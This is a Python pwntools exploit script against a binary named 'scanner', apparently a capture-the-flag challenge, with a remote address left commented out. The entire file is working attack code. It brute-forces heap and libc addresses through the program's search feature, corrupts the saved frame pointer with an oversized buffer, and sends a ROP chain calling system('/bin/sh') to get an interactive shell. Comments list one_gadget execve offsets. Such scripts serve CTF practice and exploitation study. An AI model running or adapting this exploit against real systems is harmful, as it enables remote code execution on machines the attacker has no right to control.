#!/usr/bin/python3

from pwn import *

exe = ELF("./scanner", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '59', '-I']
context.log_level 	= "DEBUG"
isDebug = False

# brva 0x0000000000001877 fgets in update buffer
# brva 0x00000000000018E5 read_parameters (menu scan)
# brva 0x0000000000001215 scanner_naive1 function
# brva 0x000000000000127F cmp al, dl
# brva 0x000000000000124D isFound = 1
# brva 0x0000000000001434 call r8 in run_scanner (goes to selected scanner)
# brva 0x000000000000137D inside run_scanner's calling the func pointer
# brva 0x00000000000018EA right after read_parameters
# brva 0x000000000000175A scanf in menu selection
# brva 0x000000000000158E malloc to get bytesToSearchFor
# brva 0x000000000000137D start of run_scanner
# brva 0x0000000000001850 start of case in switch case wher I update the main buffer

gs = '''
brva 0x00000000000014D7
brva 0x0000000000001529
brva 0x0000000000001215
brva 0x000000000000190A
brva 0x0000000000001331
brva 0x0000000000001434
brva 0x000000000000137D
brva 0x00000000000018EA
brva 0x0000000000001877
brva 0x000000000000158E
brva 0x000000000000137D
brva 0x0000000000001850
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def test_scanner_iteration_calculator(n_times):
	# The loop checks an unsigned number which could be 0xffffffffffffffff agains 0 (when it starts).
	# We can pass a large number that will use two's compliment when checked.
	# n_times is subtracted from the max value + 1.
	return 18446744073709551615 - n_times + 1

def update_buffer(payload):
	io.sendafter(b"> ", b"1")
	io.sendafter(b"buffer: ", payload) # "f" is the egg we will hint for as the last byte.

def update_buffer_for_leaking_addresses(payload):
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b"buffer: ", payload) # "f" is the egg we will hint for as the last byte.

def run_scanner(scanner_name = "naive1", allocation_size = 2, bytesToSearchFor = b'\x66\x00'):
	io.sendlineafter(b"> ", b"3")
	io.sendlineafter(b"parameters: ", f"{scanner_name} {allocation_size}".encode())
	io.sendline(bytesToSearchFor)
	return io.recv(timeout=3)  # Receive the response

def test_scanner(scanner_name = "naive1", allocation_size = 2):
	io.sendlineafter(b"> ", b"2")
	io.sendlineafter(b"parameters: ", f"{scanner_name} {allocation_size}".encode())
	io.sendline(b"w" * (allocation_size))
	io.sendlineafter(b"number of iterations: ", b"10")

# Brute-force function
def leak_addresses():
	known_prefix = b"\x66\x00" # This is the egg we are looking for + the null terminator added by scanf during "Update_buffer" call.
	known_bytes = b''  # Initialize known bytes as empty
	dynamic_byte_value = 0  # Initialize the expected dynamic byte value
	payload_size = len(known_prefix) + 1  # Starting payload size: prefix + 1 byte for brute-forcing

	# Brute-force each byte 
	heap_and_libc = 32
	heap_and_libc_and_bin = 64
	while len(known_bytes) < heap_and_libc:  # Brute-force until we catpure 32 bytes. We can leak as many as 4096 bytes.
		for byte in range(256):  # All possible byte values (0x00 - 0xff)
			
			# If we are at the position of the dynamic byte, enforce the expected value
			if len(known_bytes) >= 9:
				known_bytes = known_bytes[:8] + p8(dynamic_byte_value) + known_bytes[9:]

			# When we reach the 0x19 byte (24th), we need to update the heap address we found earlier because the malloc size has increased,
			# so the memory address is now 0xc0 instead of 0xa0. Check vis for better clarity.
			if (dynamic_byte_value == 0x19):
				known_bytes = known_bytes[:0] + p8(0xc0) + known_bytes[1:]
			
			if (dynamic_byte_value == 0x29):
				known_bytes = known_bytes[:0] + p8(0xf0) + known_bytes[1:]

			if (dynamic_byte_value == 0x39):
				known_bytes = known_bytes[:0] + p8(0x30) + p8(0xc3) + known_bytes[2:]

			# Construct the payload
			payload = flat(
				known_prefix,
				known_bytes,
				p8(byte),  # Add the current byte being brute-forced
				endian='little',
				word_size=64
			)

			# Send the payload and receive the response
			# time.sleep(0.05)
			# if (dynamic_byte_value == 0x19):
			# 	input(f"pid: {io.pid} |Script paused. Attach gdb and press Enter to continue...")
							
			response = run_scanner(allocation_size=payload_size, bytesToSearchFor=payload)
			
			# Check if the "Found" message is in the response
			if b"Found" in response:
				print(f"Found byte: {hex(byte)}")
				known_bytes += p8(byte)  # Add the found byte to known_bytes
				payload_size += 1  # Increment the payload size for next byte
								
				# Increment the dynamic byte value after finding the dynamic byte
				if len(known_bytes) >= 9:
					if (dynamic_byte_value == 0): # only once, set the value to the found byte after brute forcing it. We will increment this byte each time we find a new byte.
						dynamic_byte_value = byte

					dynamic_byte_value += 1
				break  # Move on to the next byte
			elif byte == 0xff:
				break
				# io,pause()
				# raise Exception("Failed to brute force bytes. Reached 0xff without success.")

	return known_bytes  # Return the found bytes

def exploit():
	run_scanner(scanner_name="w" * 16, allocation_size=2, bytesToSearchFor=b'\x66\x77')

def construct_repeating_payload():
	one_cycle = flat(
		p64(addr1-0x20),
		p64(0x000000000003),
		p64(0xaaaaaaaaaaaa),
		p64(libc_base + 0xe3b01),
		word_size=64,  # Ensure 64-bit words are used
		endianness='little'  # Explicitly specify little endian
	)

	# Determine how many complete cycles fit into 4096 bytes
	cycle_size = len(one_cycle)
	cycles = 4096 // cycle_size

	# Calculate total size used by the repeated cycles
	used_bytes = cycles * cycle_size

	# Calculate how much padding is needed to reach 4096 bytes
	padding_size = 4096 - used_bytes

	# Construct the payload with flat(), including the padding
	exploit_payload = flat(
		[one_cycle] * cycles,  # Repeat the cycle
		b'w' * padding_size,  # Add padding
		word_size=64,  # Ensure 64-bit words are used
		endianness='little'  # Explicitly specify little endian
	)

	return exploit_payload

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
# io = remote("94.237.63.93", 50365)
#ip_offset = 56
io = start_local(isDebug)
# io.timeout = 0.2 # <----- for remote exploit
io.timeout = 0.05
# print(f"PID: {io.pid}")
######## REMOTE ########


# We send in a buffer with 4096 bytes. 4094 of garbage + 1 as the egg we are looking for.
# We use 4094 because the 4096th byte always becomes 0x0a (drop line)
leak_libc_payload = b"w" * 4094 + b"f"
update_buffer_for_leaking_addresses(leak_libc_payload)

# leaking libc - we know we need to look for the 0x66 egg, and we append to it a 0x00. 
found_bytes = leak_addresses()

# # Convert the found bytes to two 64-bit addresses and print them
addr1 = u64(found_bytes[:8]) # heap
addr2 = u64(found_bytes[24:32]) # libc
# addr3 = u64(found_bytes[56:])
print(f"Brute-forced memory addresses (heap, libc, bin): {addr1:#018x}, {addr2:#018x}")

libc_base = addr2 - 0x24083 # offset to subtract to get libc base (__libc_start_main+243)
# libc_base = 0x7ffff7dd5000
libc.address = libc_base

heap_base = addr1 - 0x330

# bin_base = addr3 - 0x00000000000017CA
# bin.address = bin_base

# print(f"{hex(bin_base)=}")
print(f"{hex(libc.address)=}")
print(f"{hex(heap_base)=}")

# bin_pop_rdi_offset = 0x00000000000019ab # pop rdi; ret; 
# bin_ret_offset = 0x0000000000001016 # ret;
# bin_pop_rdi_offset = 0x555555554000 + 0x00000000000019ab # pop rdi; ret; 
# bin_ret_offset = 0x555555554000 + 0x0000000000001016
# one_gadget ./libc.so.6                    
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

# libc_base = 0x7ffff7dd5000
libc_bin_sh = libc_base + 0x001b45bd
libc_system = libc_base + 0x00052290
libc_pop_rdi = libc_base + 0x0000000000023b6a
libc_ret = libc_base + 0x0000000000022679

padding = 4065
exploit_payload = flat(
	b'w' * padding,
	p64(addr1-0x20), # this is bytesToSearchFor
	p64(0x000000000003), # this is scannerIndex (MSB) and amountOfBytesToRead (LSB) (example: 0x000100000003)
	p64(0xaaaaaaaaaaaa), # corrupt rbp 
	# p64(libc_base + 0xe3b01), # corrupt return address
	b'w' * (4096 - padding - 24) # pad to 4096 bytes
)

# padding = 3913
# exploit_payload = flat(
# 	b'w' * padding,
# 	p64(addr1-0x20), # this is bytesToSearchFor
# 	p64(0x000000000003), # this is scannerIndex (MSB) and amountOfBytesToRead (LSB) (example: 0x000100000003)
# 	p64(0xaaaaaaaaaaaa), # corrupt rbp 
# 	p64(libc_base + 0xe3b01), # corrupt return address
# 	b'w' * (4096 - padding - 32) # pad to 4096 bytes
# )

# craft a payload that overwrites rbp and the following address
# exploit_payload = construct_repeating_payload()

print(f"PID: {io.pid}")
pause()
update_buffer(exploit_payload)

# trigger the payload using read_parameters. This will grab 16 bytes of data and will overwrite rbp address with 00 in its LSB
exploit()
sleep(1)

# now craft a payload that updates the primary buffer and when fgets retruns it should preform the ROP chain
rop_payload = flat(
	b'w' * 25,
	p64(libc_ret),
	p64(libc_pop_rdi),
	p64(libc_bin_sh),
	p64(libc_system),
	b'w' * (4096 - 25 - 32)
)

update_buffer(rop_payload)

sleep(1)
io.interactive()
